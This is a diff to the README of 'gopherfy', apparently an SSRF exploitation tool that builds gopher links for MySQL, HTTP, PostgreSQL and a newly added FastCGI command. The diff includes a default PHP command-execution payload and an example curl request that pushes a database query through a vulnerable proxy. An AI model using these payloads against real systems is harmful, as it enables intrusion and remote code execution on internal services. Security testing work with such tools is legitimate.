@@ -11,11 +11,14 @@ curl http://example.org/ssrf/vuln/proxy?url=$(gopherfy mysql -e url -q "show dat
 
 ## How to use
 ```
+Tool to generate gopher links for exploiting SSRF
+
 Usage:
   gopherfy [command]
 
 Available Commands:
   completion  Generate the autocompletion script for the specified shell
+  fastcgi     Generate fastcgi gopher link
   help        Help about any command
   http        Generate http gopher link
   mysql       Generate mysql gopher link
@@ -25,9 +28,27 @@ Available Commands:
 Flags:
   -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
   -h, --help             help for gopherfy
+      --send             send the selector string
   -v, --version          version for gopherfy
 
 Use "gopherfy [command] --help" for more information about a command.
+```
+## FastCGI
+```
+Generate fastcgi gopher link
+
+Usage:
+  gopherfy fastcgi [flags]
+
+Flags:
+  -a, --addr string   fastcgi address (default "127.0.0.1:9000")
+  -c, --code string   code to execute (default "<?php system('whoami'); exit; ?>")
+  -f, --file string   absolute php file path (default "/usr/local/lib/php/System.php")
+  -h, --help          help for fastcgi
+
+Global Flags:
+  -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
+      --send             send the selector string
 ```
 
 ## HTTP
@@ -51,6 +72,7 @@ Flags:
 
 Global Flags:
   -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
+      --send             send the selector string
 ```
 
 ## MySQL
@@ -72,6 +94,7 @@ Flags:
 
 Global Flags:
   -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
+      --send             send the selector string
 ```
 
 ## PostgreSQL
@@ -90,6 +113,7 @@ Flags:
 
 Global Flags:
   -e, --encoder string   the encoder to use. allowed: "base64", "url" or "none" (default "none")
+      --send             send the selector string
 ```
 ## License
 [MIT](LICENCE)
